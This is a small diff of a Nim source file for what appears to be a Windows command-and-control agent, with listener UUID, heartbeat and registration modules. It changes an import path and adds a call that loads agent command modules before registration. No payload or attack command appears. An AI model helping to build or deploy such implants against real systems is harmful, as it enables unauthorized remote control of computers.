@@ -2,7 +2,8 @@ import strformat, os, times, system, base64
 import winim
 
 import core/[task, taskresult, heartbeat, http, register]
-import ../../common/[types, utils, crypto]
+import ../modules/manager
+import ../common/[types, utils, crypto]
 
 const ListenerUuid {.strdefine.}: string = ""
 const Octet1 {.intdefine.}: int = 0
@@ -53,6 +54,9 @@ proc main() =
 
     except CatchableError as err:
         echo "[-] " & err.msg
+
+    # Load agent commands
+    loadModules() 
 
     # Create registration payload
     var registration: AgentRegistrationData = config.collectAgentMetadata()
